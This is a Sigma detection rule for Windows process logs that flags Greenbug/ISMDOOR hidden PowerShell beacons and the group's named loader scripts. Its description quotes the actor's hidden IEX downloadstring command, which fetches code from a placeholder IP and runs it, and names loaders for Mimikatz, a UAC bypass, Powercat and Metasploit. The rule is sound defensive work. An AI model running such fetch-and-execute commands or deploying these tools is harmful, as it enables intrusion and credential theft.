title: Greenbug Hidden PowerShell DownloadString Beacon and Named Loaders
id: 9d2e5a71-6c4b-48f3-8a19-5b7c2d9e1f40
status: experimental
description: |
    Detects Greenbug/ISMDOOR hidden PowerShell C2 beacons and ingress tool transfer (T1059.001, T1105).
    The group runs PowerShell.exe -nop -w hidden -c ... IEX $x.downloadstring('http://<rawIP>:<port>/...')
    to beacon and pull follow-on tooling, and deploys named loaders ccd61.ps1 (Mimikatz), ivb.ps1
    (eventvwr UAC bypass), dp.ps1 (Powercat), msf.ps1 (Metasploit). Keys on the hidden/execution-policy
    flags combined with a net.webclient downloadstring/IEX in-memory download, plus the actor's named
    loader scripts.
references:
    - https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia
    - https://www.netscout.com/blog/asert/greenbugs-dns-isms
author: mena-detection-library
date: 2026-08-30
tags:
    - attack.execution
    - attack.command-and-control
    - attack.t1059.001
    - attack.t1105
    - mena-detection-library.greenbug
logsource:
    category: process_creation
    product: windows
detection:
    selection_ps:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_beacon:
        CommandLine|contains|all:
            - 'hidden'
            - 'downloadstring'
    selection_iex:
        CommandLine|contains|all:
            - 'downloadstring'
            - 'iex'
    selection_loaders:
        CommandLine|contains:
            - 'ccd61.ps1'
            - 'ivb.ps1'
            - 'dp.ps1'
            - 'msf.ps1'
    condition: selection_ps and (selection_beacon or selection_iex or selection_loaders)
falsepositives:
    - Some software deployment or admin scripts use IEX downloadstring - validate the URL (raw IP and
      non-standard port are strong indicators) and the calling context before dismissing
level: high
